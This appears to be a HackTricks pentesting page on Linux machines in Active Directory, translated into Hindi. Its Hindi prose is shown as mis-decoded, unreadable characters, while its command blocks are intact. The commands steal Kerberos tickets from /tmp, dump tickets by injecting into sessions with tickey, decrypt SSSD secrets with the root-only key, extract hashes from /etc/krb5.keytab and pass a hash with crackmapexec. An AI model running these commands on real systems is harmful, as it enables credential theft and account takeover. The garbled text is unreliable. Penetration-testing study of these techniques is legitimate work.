# рд▓рд┐рдирдХреНрд╕ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж рдЯреНрд╡рд┐рдЯрд░ ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П рдЯреНрд╡рд┐рдЪ ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе рдпреВрдЯреНрдпреВрдм ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**рдПрдирдПрдлрдЯреА**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рдкреАрдПрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** **ЁЯРж**[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕-рдХреНрд▓рд╛рдЙрдб рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud)** рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>

рдПрдХ рд▓рд┐рдирдХреНрд╕ рдорд╢реАрди рдПрдХ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рднреА рдореМрдЬреВрдж рд╣реЛ рд╕рдХрддреА рд╣реИред

рдПрдХ рдПрдбреА рдореЗрдВ рдПрдХ рд▓рд┐рдирдХреНрд╕ рдорд╢реАрди **рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди CCACHE рдЯрд┐рдХрдЯреНрд╕ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпреЗ рдЯрд┐рдХрдЯреНрд╕ рдХрд┐рд╕реА рднреА рдЕрдиреНрдп рдХреЗрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ рдХреА рддрд░рд╣ рдЙрдкрдпреЛрдЧ рдФрд░ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрди рдЯрд┐рдХрдЯреНрд╕ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЯрд┐рдХрдЯ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдорд╛рд▓рд┐рдХ рдпрд╛ **рдорд╢реАрди рдореЗрдВ рд░реВрдЯ** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

## рдЬрд╛рдВрдЪ

### рд▓рд┐рдирдХреНрд╕ рд╕реЗ рдПрдбреА рдЬрд╛рдВрдЪ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рдПрдбреА рдкрд░ рдкрд╣реБрдВрдЪ рд╣реИ (рдпрд╛ рд╡рд┐рдВрдбреЛрдЬрд╝ рдореЗрдВ рдмреИрд╢) рддреЛ рдЖрдк [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдбреА рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк рд▓рд┐рдирдХреНрд╕ рд╕реЗ рдПрдбреА рдХреЛ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ **рдЕрдиреНрдп рддрд░реАрдХреЗ рд╕реАрдЦрдиреЗ** рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рд╡рд┐рдВрдбреЛрдЬрд╝ **рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА** рдХреЗ рд▓рд┐рдП рдПрдХ рдУрдкрди-рд╕реЛрд░реНрд╕ **рд╡реИрдХрд▓реНрдкрд┐рдХ** рд╣реИ, рдореБрдЦреНрдп рд░реВрдк рд╕реЗ **рдпреВрдирд┐рдХреНрд╕** рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдПред рдпрд╣ рдПрдХ рдкреВрд░реНрдг **рдПрд▓рдбреАрдПрдкреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛** рдХреЛ рдПрдХ MIT **рдХреЗрд░рдмреЗрд░реЛрд╕** рдХреБрдВрдЬреА рд╡рд┐рддрд░рдг рдХреЗрдВрджреНрд░ рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рддрд╛ рд╣реИ рдЬреЛ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рд╕рдорд╛рди рдкреНрд░рдмрдВрдзрди рдХреЗ рд▓рд┐рдП рд╣реИред CA рдФрд░ RA рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рдмрдВрдзрди рдХреЗ рд▓рд┐рдП Dogtag **рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рд╕рд┐рд╕реНрдЯрдо** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рдпрд╣ **рдорд▓реНрдЯреА-рдлреИрдХреНрдЯрд░** рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╕реНрдорд╛рд░реНрдЯрдХрд╛рд░реНрдб рд╢рд╛рдорд┐рд▓ рд╣реИрдВред SSSD рдпреВрдирд┐рдХреНрд╕ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдПрдХреАрдХреГрдд рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдБ рджреЗрдЦреЗрдВ:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## рдЯрд┐рдХрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдЦреЗрд▓рдирд╛

### рдкрд╛рд╕ рдж рдЯрд┐рдХрдЯ

рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдЖрдкрдХреЛ рд╡рд┐рднрд┐рдиреНрди рд╕реНрдерд╛рди рдорд┐рд▓реЗрдВрдЧреЗ рдЬрд╣рд╛рдБ рдЖрдк **рд▓рд┐рдирдХреНрд╕ рд╣реЛрд╕реНрдЯ рдореЗрдВ рдХреЗрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯреНрд╕ рдкрд╛рдПрдВрдЧреЗ**, рдЕрдЧрд▓реЗ рдкреГрд╖реНрда рдкрд░ рдЖрдк рд╕реАрд╕реАрдПрд╕реА рдЯрд┐рдХрдЯреНрд╕ рдкреНрд░рд╛рд░реВрдк рдХреЛ рдХрд┐рд░реНрдмреА рдореЗрдВ рдмрджрд▓рдирд╛ рд╕реАрдЦ рд╕рдХрддреЗ рд╣реИрдВ (рдЬрд┐рд╕реЗ рдЖрдкрдХреЛ рд╡рд┐рдВрдбреЛрдЬрд╝ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ) рдФрд░ рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдкреАрдЯреАрдЯреА рд╣рдорд▓рд╛ рдХреИрд╕реЗ рдХрд░реЗрдВ:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### /tmp рд╕реЗ рд╕реАрд╕реАрдПрд╕реА рдЯрд┐рдХрдЯ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ

рд╕реАрд╕реАрдПрд╕реА рдлрд╝рд╛рдЗрд▓реЗрдВ **рдХреЗрд░рдмреЗрд░реЛрд╕ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╛рдЗрдирд░реА рдкреНрд░рд╛рд░реВрдк** рд╣реЛрддреА рд╣реИрдВ рдЬреЛ рдЖрдо рддреМрд░ рдкрд░ `/tmp` рдореЗрдВ 600 рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╣реЛрддреА рд╣реИрдВред рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЙрдирдХреЗ **рдирд╛рдо рдкреНрд░рд╛рд░реВрдк, `krb5cc_%{uid}`,** рдХреЗ рд╕рд╛рде рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдЙрдкрдпреЛрдХреНрддрд╛ рдХреЗ UID рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИред рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЯрд┐рдХрдЯ рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП, **рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ `KRB5CCNAME`** рдХреЛ рд╡рд╛рдВрдЫрд┐рдд рдЯрд┐рдХрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдкрде рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рд╕реЗ рдЗрд╕рдХрд╛ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рд╣реЛ рд╕рдХреЗред

рд╡рд░реНрддрдорд╛рди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ рдЯрд┐рдХрдЯ рдХреА рд╕реВрдЪреА `env | grep KRB5CCNAME` рдХреЗ рд╕рд╛рде рджреЗрдЦреЗрдВред рдкреНрд░рд╛рд░реВрдк рд╕рдВрд╡рд╣рдиреАрдп рд╣реИ рдФрд░ рдЯрд┐рдХрдЯ рдХреЛ **рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдХреЛ рд╕реЗрдЯ рдХрд░рдХреЗ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** `export KRB5CCNAME=/tmp/ticket.ccache`ред рдХреЗрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ рдирд╛рдо рдкреНрд░рд╛рд░реВрдк `krb5cc_%{uid}` рд╣реИ рдЬрд╣рд╛рдБ uid рдЙрдкрдпреЛрдХреНрддрд╛ UID рд╣реИред
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### рдХреАрдХреИрд╢ рдЯрд┐рдХрдЯ рдХреБрдВрдЬреАрдЖрд╡рд▓рдВрдмрди рд╕реЗ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ

**рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рд╕реНрдореГрддрд┐ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХреЗрд░рдмреЗрд░реЛрд╕ рдЯрд┐рдХрдЯ рдирд┐рдХрд╛рд▓реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЬрдм рдорд╢реАрди рдХреА рдкреАрдЯреНрд░реЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдЕрдХреНрд╖рдо рд╣реЛрддреА рд╣реИ (`/proc/sys/kernel/yama/ptrace_scope`). рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрдпреБрдХреНрдд рдЙрдкрдХрд░рдг [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) рдкрд░ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╕рддреНрд░реЛрдВ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдХреЗ рдЯрд┐рдХрдЯреЛрдВ рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрдХ рд╣реЛрддрд╛ рд╣реИ рдФрд░ `/tmp` рдореЗрдВ рдбрдВрдк рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рдЙрдкрдХрд░рдг рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдФрд░ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╡рд┐рднрд┐рдиреНрди рд╕рддреНрд░реЛрдВ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧреА, рдЙрддреНрдкрдиреНрди рдЯрд┐рдХрдЯ рдХреЛ `/tmp` рдореЗрдВ `__krb_UID.ccache` рдирд╛рдордХ рд╕рдВрд░рдЪрдирд╛ рдХреЗ рд╕рд╛рде рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рдХреЗ рд╕рдлрд▓рддрд╛ рдХреА рд╕рдВрдХреЗрдд рджреЗрдЧреАред


### SSSD KCM рд╕реЗ CCACHE рдЯрд┐рдХрдЯ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ

SSSD рдПрдХ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдкрде `/var/lib/sss/secrets/secrets.ldb` рдкрд░ рдмрдирд╛рдП рд░рдЦрддрд╛ рд╣реИред рд╕рдВрдмрдВрдзрд┐рдд рдХреБрдВрдЬреА рдХреЗрд╡рд▓ рд░реВрдЯ рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рд╣реЛрддреЗ рд╣реИрдВ, рдЬреЛ рдкрде `/var/lib/sss/secrets/.secrets.mkey` рдкрд░ рдПрдХ рдЫрд┐рдкреА рд╣реБрдИ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдХреБрдВрдЬреА рдХреЛ рдХреЗрд╡рд▓ рд░реВрдЯ рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рд╣реЛрдиреЗ рдкрд░ рд╣реА рдкрдврд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

--рдбреЗрдЯрд╛рдмреЗрд╕ рдФрд░ --рдХреБрдВрдЬреА рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде SSSDKCMExtractor рдХреЛ рдЖрд╣реНрд╡рд╛рди рдХрд░рдирд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рд╡рд┐рд╢реНрд▓реЗрд╖рд┐рдд рдХрд░реЗрдЧрд╛ рдФрд░ рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдЧрд╛ред
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреИрд╢ рдХрд░реНрдмреЗрд░реЛрд╕ рдмреНрд▓реЙрдм рдХреЛ рдПрдХ рдЙрдкрдпреЛрдЧреА рдХрд░реНрдмреЗрд░реЛрд╕ рд╕реАрдХреИрд╢ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд░реВрдкрд╛рдВрддрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** рдЬреЛ Mimikatz/Rubeus рдХреЛ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рдХреЗрдЯреИрдм рд╕реЗ рд╕реАрдХреИрд╢ рдЯрд┐рдХрдЯ рдкреБрдирдГрдкреНрд░рдпреЛрдЧ
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### /etc/krb5.keytab рд╕реЗ рдЦрд╛рддреЗ рдирд┐рдХрд╛рд▓реЗрдВ

рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХреБрдВрдЬреА, рдЬреЛ рдЬрдбрд╝ рд╕реНрд╡рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдИ рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ, рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ **`/etc/krb5.keytab`** рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИрдВред рдпреЗ рдХреБрдВрдЬреА, рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рдорд╛рди рд╣реИрдВ, рдЬрд┐рдиреНрд╣реЗрдВ рдХрдбрд╝реА рдЧреЛрдкрдиреАрдпрддрд╛ рдХреА рдорд╛рдВрдЧ рд╣реЛрддреА рд╣реИред

рдХреБрдВрдЬреА рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП, **`klist`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдЙрдкрдХрд░рдг рдХреБрдВрдЬреА рд╡рд┐рд╡рд░рдг рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **NT Hash** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЬрдм рдХреБрдВрдЬреА рдкреНрд░рдХрд╛рд░ рдХреЛ 23 рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Linux рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП, **`KeyTabExtract`** рдПрдХ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ RC4 HMAC рд╣реИрд╢ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ NTLM рд╣реИрд╢ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИред
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS рдкрд░, **`bifrost`** рдХреБрдВрдЬреАрдЯреИрдм рдлрд╝рд╛рдЗрд▓ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрдХрд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
рдХреЛрдбрд┐рдд рдЦрд╛рддрд╛ рдФрд░ рд╣реИрд╢ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, **`crackmapexec`** рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## рд╕рдВрджрд░реНрдн
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**рдПрдирдПрдлрдЯреА**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **ЁЯРж**[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕-рдХреНрд▓рд╛рдЙрдб рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ**ред

</details>
